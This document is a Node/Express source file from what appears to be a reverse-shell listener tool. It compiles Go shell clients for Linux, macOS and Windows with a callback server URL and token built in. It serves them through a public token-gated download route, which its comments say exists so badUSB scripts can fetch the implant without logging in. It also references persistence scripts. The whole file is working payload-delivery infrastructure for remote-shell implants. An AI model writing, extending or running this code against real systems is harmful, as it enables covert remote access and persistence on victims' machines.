import { execFile } from "node:child_process";
import fs from "node:fs";
import path from "node:path";
import os from "node:os";
import { fileURLToPath } from "node:url";
import express from "express";
import config from "../config.js";

const here = path.dirname(fileURLToPath(import.meta.url));

// Directory holding per-OS autoexec scripts for the /cfg endpoint.
// Layout: autoexec/<os>.sh  (or .ps1 for windows). Mounted as a volume in
// production so operators can edit persistence scripts without rebuilding.
const AUTOEXEC_DIR = process.env.AUTOEXEC_DIR
  ? path.resolve(process.env.AUTOEXEC_DIR)
  : path.resolve(here, "..", "autoexec");

const TARGETS = {
  "linux-amd64": { goos: "linux", goarch: "amd64", suffix: "" },
  "linux-arm64": { goos: "linux", goarch: "arm64", suffix: "" },
  "linux-arm-7": { goos: "linux", goarch: "arm", goarm: "7", suffix: "" },
  "linux-mips-softfloat": { goos: "linux", goarch: "mips", gomips: "softfloat", suffix: "" },
  "linux-mipsle-softfloat": { goos: "linux", goarch: "mipsle", gomips: "softfloat", suffix: "" },
  "linux-386": { goos: "linux", goarch: "386", suffix: "" },
  "darwin-arm64": { goos: "darwin", goarch: "arm64", suffix: "" },
  "darwin-amd64": { goos: "darwin", goarch: "amd64", suffix: "" },
  "windows-amd64": { goos: "windows", goarch: "amd64", suffix: ".exe" },
  "windows-arm64": { goos: "windows", goarch: "arm64", suffix: ".exe" },
};

function buildClient(target, serverURL, tags) {
  return new Promise((resolve, reject) => {
    const t = TARGETS[target];
    if (!t) return reject(new Error(`unsupported target: ${target}`));

    const clientDir = path.resolve(here, "..", "client");
    if (!fs.existsSync(path.join(clientDir, "go.mod"))) {
      return reject(new Error("client sources not found in image"));
    }

    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "rsl-build-"));
    const outName = "rsl-client" + t.suffix;
    const outPath = path.join(tmp, outName);

    const ldflags = [
      `-s -w`,
      `-X github.com/nemanjan00/reverse-shell-listener/client.defaultServerURL=${serverURL || ""}`,
      `-X github.com/nemanjan00/reverse-shell-listener/client.defaultTags=${tags || ""}`,
      `-X github.com/nemanjan00/reverse-shell-listener/client.defaultToken=${config.BUILD_TOKEN || ""}`,
    ].join(" ");

    const env = {
      ...process.env,
      GOOS: t.goos,
      GOARCH: t.goarch,
      CGO_ENABLED: "0",
    };
    if (t.goarm) env.GOARM = t.goarm;
    if (t.gomips) env.GOMIPS = t.gomips;

    const args = ["build", "-trimpath", "-ldflags", ldflags, "-o", outPath, "./cmd"];
    execFile("go", args, { cwd: clientDir, env, maxBuffer: 50 * 1024 * 1024 }, (err) => {
      if (err) {
        fs.rmSync(tmp, { recursive: true, force: true });
        return reject(err);
      }
      resolve({ outPath, outName, tmp });
    });
  });
}

// Parse os=...&arch=... query params (or ?target=linux-arm-7 directly) into a
// TARGETS key. Returns null if we can't map it.
function resolveTarget(query) {
  if (query.target && TARGETS[query.target]) return query.target;
  const osName = String(query.os || "").toLowerCase();
  const arch = String(query.arch || "").toLowerCase();
  if (!osName || !arch) return null;
  // Common aliases a badUSB author might type.
  const osMap = { linux: "linux", macos: "darwin", mac: "darwin", darwin: "darwin", windows: "windows", win: "windows" };
  const archMap = {
    x86_64: "amd64", amd64: "amd64", x64: "amd64",
    aarch64: "arm64", arm64: "arm64",
    armv7: "arm-7", arm: "arm-7",
    armv6: null, // unsupported by our target set
    i386: "386", i686: "386", x86: "386",
    mips: "mips-softfloat", mipsle: "mipsle-softfloat", mipsel: "mipsle-softfloat",
  };
  const o = osMap[osName];
  const a = archMap[arch];
  if (!o || !a) return null;
  const key = `${o}-${a}`;
  return TARGETS[key] ? key : null;
}

// Build the mux server URL from the incoming request's own host. The badUSB
// author doesn't need to know it — they just hit the listener's public URL.
function serverURLFromRequest(req) {
  const proto = req.secure || req.headers["x-forwarded-proto"] === "https" ? "wss" : "ws";
  const host = req.headers["x-forwarded-host"] || req.headers.host || "";
  return host ? `${proto}://${host}/mux` : "";
}

// Public, token-gated download endpoint. Mounted BEFORE requireAuth in
// server.js so badUSB scripts don't need a session cookie.
export function dlRouter() {
  const router = express.Router();

  router.get("/", async (req, res) => {
    if (!config.BUILD_TOKEN) {
      return res.status(404).json({ error: "BUILD_TOKEN not set" });
    }
    const token = String(req.query.token || "");
    if (!token || token !== config.BUILD_TOKEN) {
      return res.status(403).json({ error: "invalid token" });
    }

    const target = resolveTarget(req.query);
    if (!target) {
      return res.status(400).json({
        error: "bad target",
        detail: "use ?os=linux&arch=amd64 or ?target=linux-arm-7",
        targets: Object.keys(TARGETS),
      });
    }

    const serverURL = String(req.query.server || "") || serverURLFromRequest(req);
    const tags = String(req.query.tags || "");

    try {
      const { outPath, outName, tmp } = await buildClient(target, serverURL, tags);
      res.setHeader("Content-Type", "application/octet-stream");
      res.setHeader("Content-Disposition", `attachment; filename="${outName}"`);
      const stream = fs.createReadStream(outPath);
      stream.pipe(res);
      stream.on("close", () => fs.rmSync(tmp, { recursive: true, force: true }));
    } catch (err) {
      console.error("[dl]   failed:", err.message);
      res.status(500).json({ error: "build failed", detail: err.message });
    }
  });

  return router;
}

export function buildRouter() {
  const router = express.Router();

  router.get("/targets", (req, res) => {
    res.json(Object.keys(TARGETS));
  });

  router.get("/client", async (req, res) => {
    const target = String(req.query.target || "linux-amd64");
    const serverURL = String(req.query.server || "");
    const tags = String(req.query.tags || "");

    try {
      const { outPath, outName, tmp } = await buildClient(target, serverURL, tags);
      res.setHeader("Content-Type", "application/octet-stream");
      res.setHeader("Content-Disposition", `attachment; filename="${outName}"`);
      const stream = fs.createReadStream(outPath);
      stream.pipe(res);
      stream.on("close", () => fs.rmSync(tmp, { recursive: true, force: true }));
    } catch (err) {
      console.error("[build] failed:", err.message);
      res.status(500).json({ error: "build failed", detail: err.message });
    }
  });

  return router;
}